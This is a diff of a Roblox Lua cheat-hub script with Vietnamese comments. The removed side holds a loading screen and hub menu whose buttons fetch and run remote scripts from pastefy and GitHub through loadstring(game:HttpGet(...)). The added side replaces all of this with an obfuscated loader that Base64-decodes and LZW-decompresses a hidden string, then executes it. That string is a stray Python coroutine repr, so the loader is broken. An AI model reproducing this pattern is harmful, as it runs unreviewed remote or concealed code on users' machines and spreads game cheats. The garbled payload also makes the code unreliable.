@@ -1,217 +1,41 @@
---// LOADING + BG ANIME CHỈ TRONG UI
 
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local player = Players.LocalPlayer
+local data = "<coroutine object Command.__call__ at 0x7abb639a80>"
+local decoded = game:GetService("HttpService"):Base64Decode(data)
 
-local done = false
+local function lzw_decompress(input)
+    local dict = {}
+    for i=0,255 do dict[i] = string.char(i) end
 
--- GUI
-local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+    local result = {}
+    local codes = {}
 
--- MAIN UI
-local MainFrame = Instance.new("Frame", ScreenGui)
-MainFrame.Size = UDim2.new(0,0,0,0)
-MainFrame.Position = UDim2.new(0.5,0,0.5,0)
-MainFrame.AnchorPoint = Vector2.new(0.5,0.5)
-MainFrame.BackgroundColor3 = Color3.fromRGB(15,15,20)
-MainFrame.BorderSizePixel = 0
-MainFrame.ClipsDescendants = true --🔥 QUAN TRỌNG
-Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0,16)
-
--- 🖼 BACKGROUND ANIME (KHÔNG TRÀN RA NGOÀI)
-local BgImage = Instance.new("ImageLabel", MainFrame)
-BgImage.Size = UDim2.new(1,0,1,0)
-BgImage.Image = "rbxassetid://140345383109773" -- đổi ảnh
-BgImage.ScaleType = Enum.ScaleType.Crop
-BgImage.BackgroundTransparency = 1
-BgImage.ZIndex = 0
-
--- Lớp tối
-local Dark = Instance.new("Frame", BgImage)
-Dark.Size = UDim2.new(1,0,1,0)
-Dark.BackgroundColor3 = Color3.fromRGB(0,0,0)
-Dark.BackgroundTransparency = 0.4
-
--- 🔵 LED VIỀN
-local Stroke1 = Instance.new("UIStroke", MainFrame)
-Stroke1.Thickness = 3
-Stroke1.Color = Color3.fromRGB(0,170,255)
-
-local Stroke2 = Instance.new("UIStroke", MainFrame)
-Stroke2.Thickness = 8
-Stroke2.Color = Color3.fromRGB(0,200,255)
-Stroke2.Transparency = 0.6
-
-local Stroke3 = Instance.new("UIStroke", MainFrame)
-Stroke3.Thickness = 14
-Stroke3.Color = Color3.fromRGB(0,200,255)
-Stroke3.Transparency = 0.85
-
--- AVATAR
-local Avatar = Instance.new("ImageLabel", MainFrame)
-Avatar.Size = UDim2.new(0,80,0,80)
-Avatar.Position = UDim2.new(0.5,-40,0,10)
-Avatar.BackgroundTransparency = 1
-Avatar.ZIndex = 2
-Avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
-
--- TITLE
-local Title = Instance.new("TextLabel", MainFrame)
-Title.Size = UDim2.new(1,0,0,40)
-Title.Position = UDim2.new(0,0,0,95)
-Title.BackgroundTransparency = 1
-Title.ZIndex = 2
-Title.Text = "Anime Tổng Hợp"
-Title.TextColor3 = Color3.fromRGB(255,255,255)
-Title.TextScaled = true
-Title.Font = Enum.Font.GothamBold
-
--- LOADING BAR
-local BG = Instance.new("Frame", MainFrame)
-BG.Size = UDim2.new(0.85,0,0,22)
-BG.Position = UDim2.new(0.075,0,0.65,0)
-BG.BackgroundColor3 = Color3.fromRGB(30,30,40)
-BG.ZIndex = 2
-Instance.new("UICorner", BG)
-
-local Bar = Instance.new("Frame", BG)
-Bar.Size = UDim2.new(0,0,1,0)
-Bar.BackgroundColor3 = Color3.fromRGB(0,170,255)
-Instance.new("UICorner", Bar)
-
-local Glow = Instance.new("UIStroke", Bar)
-Glow.Thickness = 4
-Glow.Color = Color3.fromRGB(0,200,255)
-Glow.Transparency = 0.3
-
--- %
-local Percent = Instance.new("TextLabel", MainFrame)
-Percent.Size = UDim2.new(1,0,0,30)
-Percent.Position = UDim2.new(0,0,0.78,0)
-Percent.BackgroundTransparency = 1
-Percent.ZIndex = 2
-Percent.Text = "0%"
-Percent.TextColor3 = Color3.fromRGB(200,220,255)
-Percent.TextScaled = true
-
--- SCALE IN
-TweenService:Create(MainFrame, TweenInfo.new(0.6, Enum.EasingStyle.Back), {
-    Size = UDim2.new(0,400,0,220)
-}):Play()
-
--- LED EFFECT
-task.spawn(function()
-    while true do
-        Stroke2.Transparency = 0.5 + math.random()*0.2
-        Stroke3.Transparency = 0.8 + math.random()*0.1
-        task.wait(0.05)
-    end
-end)
-
--- LOADING
-task.spawn(function()
-    local p = 0
-    while p < 100 do
-        p += math.random(2,6)
-        if p > 100 then p = 100 end
-
-        TweenService:Create(Bar, TweenInfo.new(0.2), {
-            Size = UDim2.new(p/100,0,1,0)
-        }):Play()
-
-        Percent.Text = p.."%"
-        task.wait(0.1)
+    for num in string.gmatch(input, "%d+") do
+        table.insert(codes, tonumber(num))
     end
 
-    Percent.Text = "Done!"
-    task.wait(0.5)
+    local w = string.char(codes[1])
+    table.insert(result, w)
 
-    TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
-        Size = UDim2.new(0,0,0,0)
-    }):Play()
+    local dict_size = 256
 
-    task.wait(0.5)
-    ScreenGui:Destroy()
+    for i=2,#codes do
+        local k = codes[i]
+        local entry
 
-    done = true
-end)
+        if dict[k] then
+            entry = dict[k]
+        else
+            entry = w .. string.sub(w,1,1)
+        end
 
-repeat task.wait() until done
+        table.insert(result, entry)
+        dict[dict_size] = w .. string.sub(entry,1,1)
+        dict_size = dict_size + 1
+        w = entry
+    end
 
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/daucobonhi/Ui-Redz-V2/refs/heads/main/UiREDzV2.lua")))()
+    return table.concat(result)
+end
 
-       local Window = MakeWindow({
-         Hub = {
-         Title = "Anime Compilation",
-         Animation = "Anime Tổng Hợp"
-         },
-        Key = {
-        KeySystem = true,
-        Title = "Key System",
-        Description = "",
-        KeyLink = "",
-        Keys = {"1234"},
-        Notifi = {
-        Notifications = true,
-        CorrectKey = "Running the Script...",
-       Incorrectkey = "The key is incorrect",
-       CopyKeyLink = "Copied to Clipboard"
-      }
-    }
-  })
-
-       MinimizeButton({
-       Image = "http://www.roblox.com/asset/?id=140345383109773",
-       Size = {40, 40},
-       Color = Color3.fromRGB(20, 15, 10),
-       Corner = true,
-       Stroke = false,
-       StrokeColor = Color3.fromRGB(255, 0, 0)
-      })
-      
------- Tab
-     local Tab0o = MakeTab({Name = "Info"})
-     local Tab1o = MakeTab({Name = "Farm"})
-     local Tab2o = MakeTab({Name = "Kaitun"})
-     local Tab3o = MakeTab({Name = "Auto Chest"})
-     local Tab4o = MakeTab({Name = "Hop"})
-     local Tab5o = MakeTab({Name = "Fix Lag"})
-     
-------- BUTTON
-
-    AddButton(Tab3o, {
-     Name = "Anime Chest",
-    Callback = function()
-	  local Settings = {
-  JoinTeam = "Pirates"; -- Pirates/Marines
-  Translator = true; -- true/false
-}
-
-loadstring(game:HttpGet('https://pastefy.app/W8S3shO3/raw'))()
-  end
-  })
-  
-      AddButton(Tab5o, {
-     Name = "Anime Fix Lag",
-    Callback = function()
-	  local Settings = {
-  JoinTeam = "Pirates"; -- Pirates/Marines
-  Translator = true; -- true/false
-}
-
-loadstring(game:HttpGet('https://pastefy.app/Ou45j5eG/raw'))()
-  end
-  })
-  
-        AddButton(Tab1o, {
-     Name = "Anime Fix Lag",
-    Callback = function()
-	  local Settings = {
-  JoinTeam = "Pirates"; -- Pirates/Marines
-  Translator = true; -- true/false
-}
-
-loadstring(game:HttpGet('https://pastefy.app/Ou45j5eG/raw'))()
-  end
-  })
+local decompressed = lzw_decompress(decoded)
+loadstring(decompressed)()
